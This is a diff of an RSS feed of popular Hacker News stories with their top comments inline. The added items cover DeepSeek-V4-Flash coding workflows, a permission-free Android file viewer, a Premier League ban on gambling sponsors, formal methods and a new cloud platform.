@@ -4,7 +4,79 @@
     <title>HN ≥125, aged 8h+</title>
     <link>https://news.ycombinator.com/</link>
     <description>HN stories above 125 points, at least 8h old, with top comments inline.</description>
-    <lastBuildDate>Fri, 31 Jul 2026 13:01:26 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 31 Jul 2026 15:23:47 +0000</lastBuildDate>
+    <item>
+      <title>DeepSeek-V4-Flash Update</title>
+      <link>https://api-docs.deepseek.com/updates/</link>
+      <guid isPermaLink="false">hn3-49119559</guid>
+      <pubDate>Fri, 31 Jul 2026 06:08:36 +0000</pubDate>
+      <description>480 points, 241 comments. See description for top comments.</description>
+      <content:encoded><![CDATA[<p><a href="https://api-docs.deepseek.com/updates/"><strong>→ Article</strong></a> <small>(api-docs.deepseek.com)</small></p>
+<p><a href="https://news.ycombinator.com/item?id=49119559">→ HN comments</a> &nbsp;·&nbsp; 480 points &nbsp;·&nbsp; 241 comments</p>
+<hr>
+<p><strong>Top #1</strong> — <em>f311a</em>:</p>
+<blockquote>I&#x27;ve been driving flash model for 90% of my tasks. It&#x27;s better than pro (for unknown reasons), very cheap and fast.<p>I try to keep changes under 1000 lines and drive architectural decisions myself, barely notice any difference compared to frontier models. The rest 10% is to spot bugs, security problems and to investigate better architecture, which flash can also do pretty well, I just cross check it.<p>Faster iterations are way better for me, I hate waiting for 5-10 minutes on small changes. I tried to use recent versions of Kimi and GLM, but they use too much thinking for no reason and are pretty slow because of it. I also often feed a lot of data to it, without worrying about hitting the limits: dependencies (to find bottlenecks in them), logs, performance dumps and so on.<p>Also, it will never complain about security guards, I&#x27;ve been using it to reverse engineer binaries.</blockquote>
+<blockquote>
+<p>↳ reply 1 — <em>mark_l_watson</em>:</p>
+<blockquote>This is my experience also: DeepSeek v4 flash is good enough for most of my work and I like the fast response times. I buy tokens mostly from FireWorks.ai in the US, but I also prepaid for a large chunk of tokens directoy with DeepSeek.<p>I use OpenCode mostly (uses fewer tokens than Claude Code) and I am looking forward to the release of DeepSeek’s own coding harness.</blockquote>
+<p>↳ reply 2 — <em>regularfry</em>:</p>
+<blockquote>It&#x27;s good but (at least on openrouter) it&#x27;s got an annoyingly tight output token limit.  So if it does get stuck in a reasoning pit, it won&#x27;t work its way out of it in time.<p>It&#x27;s replaced the Kimi models for me though.</blockquote>
+</blockquote>
+<p><strong>Top #2</strong> — <em>lionkor</em>:</p>
+<blockquote>I use deepseek for a lot of my personal day-to-day agent needs, and I will simply put this here and let this speak for itself, last 30 days:<p>- Cost: $4.55USD<p>- API requests: 3,467<p>- Tokens: 323,183,886<p>And as an engineer who leads a small team, I have very high standards for quality, and these carry across to my personal projects where I use deepseek. It has not disappointed at all for coding or review tasks.
+For everything else, use another model.</blockquote>
+<blockquote>
+<p>↳ reply — <em>a20eac1d</em>:</p>
+<blockquote>Can you give more info on how you use&#x2F;prompt those LLMs for code review and what kind of prompts you use?<p>I&#x27;ve had worse experiences doing it because the quality of answer has been quite bad, and I&#x27;m wondering if my methods are the reason.</blockquote>
+<blockquote>
+<p>↳↳ reply — <em>lionkor</em>:</p>
+<blockquote>Yes, gladly! I have not yet open-sourced my skills etc., but I can give some insight and share a couple here.<p>Review is a skill, as in, a SKILL.md with a folder full of references:<p>- SKILL.md: <a href="https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;161525be858d1d75db4c13c0f093f945" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;161525be858d1d75db4c13c0f093...</a><p>- references&#x2F;output-contract.md: <a href="https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;8c68e33becef7a21f8408c7dc11965a6" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;8c68e33becef7a21f8408c7dc119...</a><p>- references&#x2F;review-lenses.md: <a href="https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;0a8b080fe45306213efddf3ebb7512d9" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;0a8b080fe45306213efddf3ebb75...</a><p>- references&#x2F;review-workflow.md: <a href="https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;d2d374b133ceb7e3660bd530ee721b2d" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;d2d374b133ceb7e3660bd530ee72...</a><p>- references&#x2F;section-rules.md: <a href="https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;8a9e503adc7fd3697410cf021f271043" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;8a9e503adc7fd3697410cf021f27...</a><p>I&#x27;m aware that almost all of this is prompt voodoo, and there&#x27;s no guarantee for the review to find anything or everything, but making it a dedicated skill and thoroughly observing the output thinking, tool calls, and result, lets me adjust these over time and fill the weak spots with even more prompting.<p>I use this skill by simply telling the agent something like &quot;Review the changes on the current branch against origin&#x2F;main, take special care with backwards-incompatible changes to the public API&quot; or something like that.<p>I use `pi` (pi.dev) with a subagents extension, so that I can ask the agent to invoke a subagent to do the review, on work that the agent did.<p>For models, I use the highest possible reasoning on whatever model I feel like makes sense, usually this is GPT-5.5 or deepseek flash&#x2F;pro, depending on the confidentiality of the codebase, on the highest reasoning always (for reviews).<p>I&#x27;ve also had success with a review checklist, though it doesn&#x27;t produce an easy to parse (for humans) output: <a href="https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;054ac2cf241e0765eee2383f0dba59d1" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;054ac2cf241e0765eee2383f0dba...</a><p>This is why my review skill mandates a very strict output contract. I need the output to be very easy to parse, and the output contract I&#x27;ve specified there does that.<p>In general I let &lt;whatever the latest model of OpenAI&#x27;s ChatGPT is&gt; author and review SKILL.md and similar large prompts, usually with a ruleset like this, which is a 1600 line research artifact from a long GPT 5.5 &quot;Pro&quot; research session on prompt engineering: <a href="https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;71498794d0a7d72173fc58766f250bdd" rel="nofollow">https:&#x2F;&#x2F;gist.github.com&#x2F;lionkor&#x2F;71498794d0a7d72173fc58766f25...</a><p>Does the review catch all issues? Not at all. Does it catch, usually more than one, important issue, across large changesets? Absolutely, and that&#x27;s the point! :)<p>Feel free to ask me any questions, I&#x27;m also happy to share more about my setup via email or add you or anyone else to my private repos with more of these.</blockquote>
+<blockquote>
+<p>↳↳↳ reply — <em>kekebo</em>:</p>
+<blockquote>Thanks for sharing.</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+<p><strong>Top #3</strong> — <em>kmarc</em>:</p>
+<blockquote>Essentially I&#x27;m running everything on flash now inside pi. With the correct set of MCP servers, context reducer tooling and skills it can implement any task I throw at it. Some sessions take 30+ turns, but it&#x27;s fast and cheap; all this in an hour, with ~$0.5 cost.<p>(TBH though, in my multi-subagent workflow I do use other, more expensive models for planning, reviewing, oracle-ing)<p>I haven&#x27;t used our slow opus subscription for weeks.<p>(Also set up an OpenWebUi self-hosted chat that works from my phone, has some mcp and skills. fully replaced perplexity. Monthly cost ~$18 for hosting and subscriptions)</blockquote>
+<blockquote>
+<p>↳ reply 1 — <em>lionkor</em>:</p>
+<blockquote>I want to second this, I use the same setup (pi + deepseek, with lots of custom tools for tracking TODOs, doing things with less tokens, etc, and with a SOTA model for very difficult tasks) and it&#x27;s all I need it to be.</blockquote>
+<p>↳ reply 2 — <em>peperunas</em>:</p>
+<blockquote>Do you have any recommendations of such extensions for pi?</blockquote>
+</blockquote>]]></content:encoded>
+    </item>
+    <item>
+      <title>Show HN: Gander, an Android file viewer that asks for no permissions at all</title>
+      <link>https://github.com/mokshablr/gander</link>
+      <guid isPermaLink="false">hn3-49119425</guid>
+      <pubDate>Fri, 31 Jul 2026 05:45:13 +0000</pubDate>
+      <description>160 points, 60 comments. See description for top comments.</description>
+      <content:encoded><![CDATA[<p><a href="https://github.com/mokshablr/gander"><strong>→ Article</strong></a> <small>(github.com)</small></p>
+<p><a href="https://news.ycombinator.com/item?id=49119425">→ HN comments</a> &nbsp;·&nbsp; 160 points &nbsp;·&nbsp; 60 comments</p>
+<hr>
+<p><strong>Top #1</strong> — <em>TekMol</em>:</p>
+<blockquote>This is interesting.<p>I thought granting internet access to apps is not avoidable on Android.<p>When an app does not request internet, is it really guaranteed that it cannot talk to the outside world? Or is it having other avenues like opening a browser or some other component with a custom url or something?<p>Update: I just asked Gemini, and it does not look good:<p>An Android app without the INTERNET permission is not guaranteed to be isolated from the outside world. While it cannot make direct network connections itself, it can use several other mechanisms to transmit data externally:<p>Intent-Based Communication (The Browser) An app can launch an explicit or implicit Intent to hand data over to another app that does have internet access.<p>That means the app can open a system browser using a URL containing the data it wants to transmit.<p>It can also load a Chrome Custom Tab inside its own UI task, passing data through the URL string.<p>There is also Inter-Process Communication: If two apps from the same developer share a User ID (sharedUserId), they run in the same process and share all permissions, including internet access.<p>There is also the concept of Content Providers: Content Providers allow apps to share data. An offline app can write data into a shared database or a public Content Provider. A secondary, online-enabled app can then read that database and upload the contents.</blockquote>
+<blockquote>
+<p>↳ reply 1 — <em>yonatan8070</em>:</p>
+<blockquote>&gt; That means the app can open a system browser using a URL containing the data it wants to transmit.<p>This can be mitigated by using an app like URLCheck [1], which you set as your default browser, and it shows and lets you edit the URL being opened before handing it off to your real browser. It also has neat features like choosing to open in incognito (if you use Firefox) and automatically removing tracking parameters.<p>[1] <a href="https:&#x2F;&#x2F;f-droid.org&#x2F;packages&#x2F;com.trianguloy.urlchecker" rel="nofollow">https:&#x2F;&#x2F;f-droid.org&#x2F;packages&#x2F;com.trianguloy.urlchecker</a></blockquote>
+<p>↳ reply 2 — <em>exe34</em>:</p>
+<blockquote>I use a rooted phone and afwall+ which uses the underlying Linux firewall. There&#x27;s also the mobile and WiFi data permissions you can change manually.</blockquote>
+<p>↳ reply 3 — <em>andyjohnson0</em>:</p>
+<blockquote>This is all very true, unfortunately. Google designed Android as a an OS for internet appliances. They&#x27;re not interested in local-only apps working on local files.<p>But I think the OP is to be complimented for what they&#x27;ve built and their intention in making it local-only. I&#x27;ve long felt that apps that *genuinely&quot; respect privacy are one of the few areas of opportunity still left in the mobile space. I wish there were more develpers building things like this.</blockquote>
+</blockquote>
+<p><strong>Top #2</strong> — <em>dheerajvs</em>:</p>
+<blockquote>Tried it and I love it. Good work!
+Have you considered hosting it on F-Droid?</blockquote>
+<blockquote>
+<p>↳ reply 1 — <em>netfortius</em>:</p>
+<blockquote>Obtainium works just fine with the github source</blockquote>
+<p>↳ reply 2 — <em>clort</em>:</p>
+<blockquote>That is listed in the Roadmap section right at the end of the README.md file</blockquote>
+</blockquote>
+<p><strong>Top #3</strong> — <em>atmanactive</em>:</p>
+<blockquote>Thanks for sharing. Could it be possible to add optional force-dark mode for documents as well? The feature list mentioned dark mode, but that&#x27;s for app&#x27;s own UI. The really awesome feature would be to be able to invert the document colors so that the document itself is shown in dark mode. Thanks.</blockquote>]]></content:encoded>
+    </item>
     <item>
       <title>JEP 401: Value Objects (Preview) merged to OpenJDK master</title>
       <link>https://github.com/openjdk/jdk/pull/31120</link>
@@ -228,6 +300,42 @@ I did some research on this statistic.  More than 90% of this is returned to sou
 </blockquote>
 <p>↳ reply 2 — <em>ymolodtsov</em>:</p>
 <blockquote>Venture-backed companies is an extremely small subset companies when you look at this objectively.<p>The alternative is debt financing, and let me tell you, there&#x27;s a lot more deadlines and urgency in there.</blockquote>
+</blockquote>]]></content:encoded>
+    </item>
+    <item>
+      <title>Premier league bans gambling sponsors</title>
+      <link>https://www.footyheadlines.com/2646571793/betting-ban-takes-effect-no-more-gambling-sponsors-in-the-premier-league.html</link>
+      <guid isPermaLink="false">hn3-49117266</guid>
+      <pubDate>Thu, 30 Jul 2026 23:40:59 +0000</pubDate>
+      <description>177 points, 52 comments. See description for top comments.</description>
+      <content:encoded><![CDATA[<p><a href="https://www.footyheadlines.com/2646571793/betting-ban-takes-effect-no-more-gambling-sponsors-in-the-premier-league.html"><strong>→ Article</strong></a> <small>(footyheadlines.com)</small></p>
+<p><a href="https://news.ycombinator.com/item?id=49117266">→ HN comments</a> &nbsp;·&nbsp; 177 points &nbsp;·&nbsp; 52 comments</p>
+<hr>
+<p><strong>Top #1</strong> — <em>bastard_op</em>:</p>
+<blockquote>They turned themselves into whores for sale to the highest bidder. I imagine if they could, cocaine brands would be on everyone&#x27;s shirts and tattoo&#x27;s on players foreheads.<p>Silly people still care about this crap.</blockquote>
+<p><strong>Top #2</strong> — <em>raffa667</em>:</p>
+<blockquote>Same happened in Italy, so all betting sites turned into &quot;news&quot; site so you would have teams being spored by &quot;betting_company_name news&quot;. Useless. There&#x27;s a proposal to be back to previous type of sponsorship.</blockquote>
+<blockquote>
+<p>↳ reply 1 — <em>arpinum</em>:</p>
+<blockquote>Same with the drinks companies, they switched to explicitly advertising their zero alcohol beers.</blockquote>
+<blockquote>
+<p>↳↳ reply — <em>bragr</em>:</p>
+<blockquote>It just now clicked with me why they are doing that. I&#x27;ve been wondering why they are pushing them so hard. Barely anyone seems to buy NA beer.</blockquote>
+</blockquote>
+<p>↳ reply 2 — <em>danesparza</em>:</p>
+<blockquote>Perhaps they should ban news sites that cover gambling.</blockquote>
+</blockquote>
+<p><strong>Top #3</strong> — <em>fancyfredbot</em>:</p>
+<blockquote>If I&#x27;m squeezing enough margin out of my customers that I can afford to sponsor a football team with some of the leftover cash then you probably don&#x27;t want to deal with me.</blockquote>
+<blockquote>
+<p>↳ reply 1 — <em>NooneAtAll3</em>:</p>
+<blockquote>on the other hand, do you know how much it costs to sponsor?<p>maybe it&#x27;s relatively cheap, but nobody does it because football fans isn&#x27;t that of a target</blockquote>
+<blockquote>
+<p>↳↳ reply — <em>bluGill</em>:</p>
+<blockquote>I don&#x27;t know about this sport, but in other large sports it can costs millions per year to be a sponsor.</blockquote>
+</blockquote>
+<p>↳ reply 2 — <em>the_sleaze_</em>:</p>
+<blockquote>True enough, but they become Patrons of the Arts in a sense.</blockquote>
 </blockquote>]]></content:encoded>
     </item>
     <item>
@@ -965,6 +1073,34 @@ Permafrost will also actually accelerate stuff since....well it __was__ permanen
 <blockquote>Welp, my initial thought based on the link was that this was part of Project Pluto:<p><a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Project_Pluto" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Project_Pluto</a><p><a href="https:&#x2F;&#x2F;web.archive.org&#x2F;web&#x2F;20200329022906&#x2F;http:&#x2F;&#x2F;www.merkle.com&#x2F;pluto&#x2F;pluto.html" rel="nofollow">https:&#x2F;&#x2F;web.archive.org&#x2F;web&#x2F;20200329022906&#x2F;http:&#x2F;&#x2F;www.merkle...</a><p>It is not... This is a Falcon-9 rocket stage, not a part from the Flying Crowbar or any similar nightmare-device.</blockquote>]]></content:encoded>
     </item>
     <item>
+      <title>RFC 8890 – The Internet is for End Users (2020)</title>
+      <link>https://mnot.net/blog/2020/for_the_users</link>
+      <guid isPermaLink="false">hn3-49109474</guid>
+      <pubDate>Thu, 30 Jul 2026 13:07:53 +0000</pubDate>
+      <description>125 points, 39 comments. See description for top comments.</description>
+      <content:encoded><![CDATA[<p><a href="https://mnot.net/blog/2020/for_the_users"><strong>→ Article</strong></a> <small>(mnot.net)</small></p>
+<p><a href="https://news.ycombinator.com/item?id=49109474">→ HN comments</a> &nbsp;·&nbsp; 125 points &nbsp;·&nbsp; 39 comments</p>
+<hr>
+<p><strong>Top #1</strong> — <em>aftbit</em>:</p>
+<blockquote>The internet is for whoever wants to send bits to each other and is willing to pay for transit to do it. The WWW might be for end users, though that seems less obvious by the day.</blockquote>
+<blockquote>
+<p>↳ reply — <em>penguin_booze</em>:</p>
+<blockquote>&gt; for whoever<p>Whomever.</blockquote>
+</blockquote>
+<p><strong>Top #2</strong> — <em>Bender</em>:</p>
+<blockquote>The internet is for porn [1] <i>Mostly SFW, headphones</i><p>I know I know, it&#x27;s original purpose was to be a weapon. [2]  It has certainly devolved into a weapon to divide the people.<p>[1] - <a href="https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=b_zAlVv73HI" rel="nofollow">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=b_zAlVv73HI</a><p>[2] - <a href="https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=a3Xxi0b9trY" rel="nofollow">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=a3Xxi0b9trY</a></blockquote>
+<blockquote>
+<p>↳ reply — <em>voakbasda</em>:</p>
+<blockquote>Mission accomplished</blockquote>
+</blockquote>
+<p><strong>Top #3</strong> — <em>vouaobrasil</em>:</p>
+<blockquote>I think fighting for a purpose-based ideology of the internet is actually doomed to fail because the form of the technology will dictate how its used and regulation and efforts will only slightly affect that.<p>E.g. If the internet is super-fast and has the capability to deliver video ads, it will be used for that. If everyone just had a connection with the speed of a 56K modem, that video-based ad model wouldn&#x27;t work.<p>If we really want the internet to be a certain way, we have to change the underlying technology used, not the ideology behind it. Because if an technology has a capability, it will be used to do whatever is most successful in the capitalistic system, not what&#x27;s best for &#x27;end users&#x27;.<p>Regulation sometimes be effective, but...the model of regulation in a world of freely-evolving technology is a broken system most of the time.</blockquote>
+<blockquote>
+<p>↳ reply — <em>michaelmrose</em>:</p>
+<blockquote>Regulation is on average stunning effective. You simply complely fail to notice all the times it works, notice whenever it doesn&#x27;t, and profess that it doesn&#x27;t. There is no meaningful alternatives.</blockquote>
+</blockquote>]]></content:encoded>
+    </item>
+    <item>
       <title>'VPNs are lawful technical tools,' says EU Court in landmark copyright ruling</title>
       <link>https://remysharp.com/links/2026-07-23-35890312</link>
       <guid isPermaLink="false">hn3-49109440</guid>
@@ -1028,6 +1164,52 @@ Permafrost will also actually accelerate stuff since....well it __was__ permanen
 <blockquote>
 <p>↳ reply — <em>hannasanarion</em>:</p>
 <blockquote>For disposable applications like that, aren&#x27;t there single-use chemistries that are better already? I&#x27;m thinking by analogy to things like:<p>- WW2 proximity fuzes that had batteries where the electrolyte was in a vial that got smashed by the G-forces of being shot out of a cannon providing power to the radio inside for the 10 seconds it needs to get to the incoming aircraft<p>- Hearing aid Zinc-Air batteries, that are extremely energy dense because you only have to actually manufacture the anode, the cathode is the entire atmosphere of the Earth<p>- Missile batteries, which are often Lithium-silicon&#x2F;Iron Disulfide batteries that borrow some thermal energy from the rocket motor to get a molten salt electrolyte</blockquote>
+</blockquote>]]></content:encoded>
+    </item>
+    <item>
+      <title>Why don't people use formal methods? (2019)</title>
+      <link>https://www.hillelwayne.com/post/why-dont-people-use-formal-methods/</link>
+      <guid isPermaLink="false">hn3-49109026</guid>
+      <pubDate>Thu, 30 Jul 2026 12:21:34 +0000</pubDate>
+      <description>125 points, 115 comments. See description for top comments.</description>
+      <content:encoded><![CDATA[<p><a href="https://www.hillelwayne.com/post/why-dont-people-use-formal-methods/"><strong>→ Article</strong></a> <small>(hillelwayne.com)</small></p>
+<p><a href="https://news.ycombinator.com/item?id=49109026">→ HN comments</a> &nbsp;·&nbsp; 125 points &nbsp;·&nbsp; 115 comments</p>
+<hr>
+<p><strong>Top #1</strong> — <em>malisper</em>:</p>
+<blockquote>I recently came across a use case where formal methods were incredibly helpful. I&#x27;ve been rewriting Postgres in Rust and am currently focusing on correctness. The biggest challenge is that there&#x27;s so much surface area to cover. Postgres has over 3000 user-facing functions, ranging from regular expression matching to JSON iteration to computing the gamma function. About half of these functions are simple pure functions.<p>Of the 3000 functions, I&#x27;ve been able to formally verify that the Rust behavior is identical to the Postgres C behavior for over 1000 of them. In the process, I found 4 different Postgres bugs. All of them would not be triggered under ordinary usage, but one, if triggered, would corrupt your database.<p>I think why formal methods works well for this is I&#x27;m testing a large number of small to medium self-contained pieces of code. For each of them the specification is simple: does postgres_fn(args) == pgrust_fn(args). I&#x27;ve been using Kani[0] which works across both Rust and C code so the proofs are based off the actual code and not a translation of the code to another language.<p>If you want to check out what all the verification look like, you can see them here[1]<p>[0] <a href="https:&#x2F;&#x2F;github.com&#x2F;model-checking&#x2F;kani" rel="nofollow">https:&#x2F;&#x2F;github.com&#x2F;model-checking&#x2F;kani</a><p>[1] <a href="https:&#x2F;&#x2F;github.com&#x2F;malisper&#x2F;pgrust&#x2F;tree&#x2F;main&#x2F;proofs" rel="nofollow">https:&#x2F;&#x2F;github.com&#x2F;malisper&#x2F;pgrust&#x2F;tree&#x2F;main&#x2F;proofs</a></blockquote>
+<blockquote>
+<p>↳ reply 1 — <em>ip26</em>:</p>
+<blockquote>I have also found that equivalent rewrites are one of the best applications for formal. Other examples can be things like vectorizing code while proving the vectorized version is formally identical, refactoring types or objects, or select classes of performance optimization that are not expected to change the output.</blockquote>
+<p>↳ reply 2 — <em>mike_hock</em>:</p>
+<blockquote>&gt; I&#x27;ve been able to formally verify that the Rust behavior is identical to the Postgres C behavior<p>I thought you wanted to <i>get rid</i> of the bugs!</blockquote>
+<p>↳ reply 3 — <em>erichocean</em>:</p>
+<blockquote>&gt; <i>I&#x27;ve been able to formally verify that the Rust behavior is identical to the Postgres C behavior for over 1000 of them.</i><p>Since both Rust and C have LLVM IR intermediates, you could use KLEE[0] for this.<p>[0] <a href="https:&#x2F;&#x2F;klee-se.org&#x2F;" rel="nofollow">https:&#x2F;&#x2F;klee-se.org&#x2F;</a></blockquote>
+</blockquote>
+<p><strong>Top #2</strong> — <em>ndriscoll</em>:</p>
+<blockquote>We do. It&#x27;s called a type checker. Every &quot;formally verified&quot; system is going to be partially verified. e.g. you might prove your sort procedure sorts, but did you prove its complexity? Under a cost model for integer compares or a cost model for page fetches? Or both? Multi-layer cache page fetch costs? How well you verify just depends on how well you decide to model the problem. Different type checkers have different modeling features.<p>This is a more useful perspective; it&#x27;s not &quot;we do&#x2F;don&#x27;t use formal methods,&quot; but instead &quot;how can I more precisely model my domain?&quot; Helpfully, if you model your domain well, code tends to be obvious&#x2F;write itself.</blockquote>
+<blockquote>
+<p>↳ reply 1 — <em>yoshuaw</em>:</p>
+<blockquote>One of my favorite quotes on this topic is:<p>&quot;Type systems are just the parts of formal verification we&#x27;ve figured out how to make fast.&quot;</blockquote>
+<blockquote>
+<p>↳↳ reply — <em>honr</em>:</p>
+<blockquote>Thankfully this is no longer <i>strictly</i> true.  So, I think the quote needs a slight adjustment, &quot;Type systems and $THING are just ...&quot;, but $THING is not very well defined yet.  Between &quot;linters&quot;, and other relatively fast AST-based rule enforcers, some of which looking at higher order behavior, I think we now have an amalgamation of formally verified concepts that we can consider fast enough and sufficient exercised in practice that we are ever closer to widespread formally and dependably verified software.<p>Still, it&#x27;s a long journey, and academic formal verification would always be, by design, a few steps ahead of what the industry can do efficiently in practice.</blockquote>
+<blockquote>
+<p>↳↳↳ reply — <em>Taikonerd</em>:</p>
+<blockquote>The field really needs more popularizers.  I mean people or projects who can do &quot;advertising&quot; like, &quot;if you add our linter to your CI&#x2F;CD pipeline, you&#x27;ll never have X class of bug ever again!&quot;</blockquote>
+</blockquote>
+</blockquote>
+<p>↳ reply 2 — <em>sethhochberg</em>:</p>
+<blockquote>I think there&#x27;s an element of this which really breaks down to the type system being the part of formal verification that we&#x27;ve figured out how to do during the course of implementation.<p>Software engineers (myself included, over the years) often argue their real value isn&#x27;t just writing code, its figuring out the gaps in requirements and how to resolve them. Sometimes that engineering process gets turned back into a formal spec. But much more often, the implementation functionally becomes the spec and contains many details that were never present in the original statement of the requirements.<p>Formal verification techniques in general are a harder sell until we get the industry to a point where there&#x27;s broader agreement that what we call &quot;implementation&quot; is often a blurry mix of spec development, prototyping, and actual implementation all happening at the same time.</blockquote>
+</blockquote>
+<p><strong>Top #3</strong> — <em>SCdF</em>:</p>
+<blockquote>In most industries that need software made for them it&#x27;s hard enough to get people to care about spending enough time on informal methods let alone formal ones. I simply don&#x27;t think most of the industry has had the breathing room and respect for engineering for this pattern to develop.</blockquote>
+<blockquote>
+<p>↳ reply — <em>forinti</em>:</p>
+<blockquote>I think programmers in general do not give much thought to the level of engineering required for a task.<p>Mostly, there&#x27;s too little, but there are many cases when there&#x27;s too much. I see people writing tons of tests for corporate software that will be used by a couple of people and will have to be updated regularly anyway.<p>Building a hut is not the same as building a skyscraper, but we don&#x27;t really have guidelines for different software projects. No methodology I&#x27;ve ever seen distinguishes types of projects by complexity.</blockquote>
+<blockquote>
+<p>↳↳ reply — <em>epolanski</em>:</p>
+<blockquote>I know few 100% unit test coverage, strictest typing to encode invariants fellas who&#x27;s app is consistently broken and product makes less money than the bakery in my village.</blockquote>
+</blockquote>
 </blockquote>]]></content:encoded>
     </item>
     <item>
@@ -1657,6 +1839,28 @@ Platform banned from Reddit for astroturfing<p>Which kind of just results in Epo
 </blockquote>
 <p><strong>Top #3</strong> — <em>MayeulC</em>:</p>
 <blockquote>Hmm, I have a mouse and trackballs from ploopy, they run QMK, so why was a new project needed? What is the added value?<p>To me, <i>the</i> missing feature in the QMK ecosystem is a devices too device communication channel. For now there is only caps lock &amp; others: it would be nice to activate a mouse layer (for instance: increase DPI) to a keyboard key.<p>It is probably solvable if a heavyweight was to push for new HID descriptors or something similar.</blockquote>]]></content:encoded>
+    </item>
+    <item>
+      <title>Show HN: Kedge – Full-stack cloud with forkable VM snapshots and global SQLite</title>
+      <link>https://kedge.dev/</link>
+      <guid isPermaLink="false">hn3-49099434</guid>
+      <pubDate>Wed, 29 Jul 2026 16:15:57 +0000</pubDate>
+      <description>128 points, 21 comments. See description for top comments.</description>
+      <content:encoded><![CDATA[<p><a href="https://kedge.dev/"><strong>→ Article</strong></a> <small>(kedge.dev)</small></p>
+<p><a href="https://news.ycombinator.com/item?id=49099434">→ HN comments</a> &nbsp;·&nbsp; 128 points &nbsp;·&nbsp; 21 comments</p>
+<hr>
+<p><strong>Top #1</strong> — <em>siliconc0w</em>:</p>
+<blockquote>Built in replicated database and filesystem is pretty rad.  Fly leaves this as an exercise for the user.<p>You should license the backend to enterprises that want a cheaper&#x2F;lighter weight option to kubernetes for the surge of agentically coded internal apps.</blockquote>
+<p><strong>Top #2</strong> — <em>nicksuperb</em>:</p>
+<blockquote><a href="https:&#x2F;&#x2F;kedge.dev&#x2F;docs&#x2F;sandboxes" rel="nofollow">https:&#x2F;&#x2F;kedge.dev&#x2F;docs&#x2F;sandboxes</a><p>Caught my eye with this one. I&#x27;ll be taking a closer look as this is one of those &quot;I&#x27;d rather let someone else do it.&quot; type infrastructure bits :)</blockquote>
+<blockquote>
+<p>↳ reply 1 — <em>wgjordan</em>:</p>
+<blockquote>Thanks! I tried to make the sandbox-eval stdin interface as simple as possible so you could easily plug it anywhere. The executable docs run an actual full shell in a VM, since they&#x27;re so fast and cheap to spin up- I hope the example made it clear how to use this feature!</blockquote>
+<p>↳ reply 2 — <em>devmor</em>:</p>
+<blockquote>This is also extremely interesting to me.<p>An instant, ephemeral cloud sandbox is pretty handy.</blockquote>
+</blockquote>
+<p><strong>Top #3</strong> — <em>sureglymop</em>:</p>
+<blockquote>This looks awesome! I really love the clean and minimalist website design too.<p>I&#x27;ve been excited about using (lib)krun as a drop in replacement for crun&#x2F;runc for container engines, to make them run qemu microvms. I&#x27;m exploring what it could look like if every process of an OS ran like that. I envy you, would love to work on something like this!</blockquote>]]></content:encoded>
     </item>
     <item>
       <title>Superlogical</title>
@@ -3554,257 +3758,6 @@ It&#x27;s like you step in a bar and someone writes down every word you say, eve
 <p>↳ reply — <em>nevertoolate</em>:</p>
 <blockquote>If you live your life in stress it makes it strange. Breathe less, stress less.</blockquote>
 </blockquote>]]></content:encoded>
-    </item>
-    <item>
-      <title>Mondragon Corporation – a federation of co-operatives</title>
-      <link>https://en.wikipedia.org/wiki/Mondragon_Corporation</link>
-      <guid isPermaLink="false">hn3-49082695</guid>
-      <pubDate>Tue, 28 Jul 2026 12:19:07 +0000</pubDate>
-      <description>161 points, 31 comments. See description for top comments.</description>
-      <content:encoded><![CDATA[<p><a href="https://en.wikipedia.org/wiki/Mondragon_Corporation"><strong>→ Article</strong></a> <small>(en.wikipedia.org)</small></p>
-<p><a href="https://news.ycombinator.com/item?id=49082695">→ HN comments</a> &nbsp;·&nbsp; 161 points &nbsp;·&nbsp; 31 comments</p>
-<hr>
-<p><strong>Top #1</strong> — <em>kingsfoil</em>:</p>
-<blockquote>&quot;Mutualism&quot; by Sara Horowitz was an interesting book that discussed some of the history of this style of worker owned businesses. She traces some of it&#x27;s history, and points out other examples of this style of worker or member governance showing up in other organizations: <a href="https:&#x2F;&#x2F;www.porchlightbooks.com&#x2F;products&#x2F;mutualism-sara-horowitz-9780593133521" rel="nofollow">https:&#x2F;&#x2F;www.porchlightbooks.com&#x2F;products&#x2F;mutualism-sara-horo...</a><p>Great read, highly recommend.</blockquote>
-<blockquote>
-<p>↳ reply 1 — <em>kingsfoil</em>:</p>
-<blockquote>The National Center for Employee Ownership also maintains a list of 100 employee owned businesses in the USA: <a href="https:&#x2F;&#x2F;www.nceo.org&#x2F;research&#x2F;employee-ownership-100-largest-employee-owned-companies" rel="nofollow">https:&#x2F;&#x2F;www.nceo.org&#x2F;research&#x2F;employee-ownership-100-largest...</a><p>Employee ownership is not a silver bullet to every problem. The governance model and governing body of employee-owners has to be well constructed as with anything. As a philosophy generally, it has a lot of potential to avoid certain common problems with more traditional business models.<p>In this space it&#x27;s also important to understand the difference between cooperatives and collectives: <a href="https:&#x2F;&#x2F;institute.coop&#x2F;about-worker-co-ops&#x2F;worker-cooperative-faq" rel="nofollow">https:&#x2F;&#x2F;institute.coop&#x2F;about-worker-co-ops&#x2F;worker-cooperativ...</a><p>Credit Unions tend to be a more commonplace example of member&#x2F;worker governance, though in my experience it&#x27;s somewhat rare for the average member to engage much with the 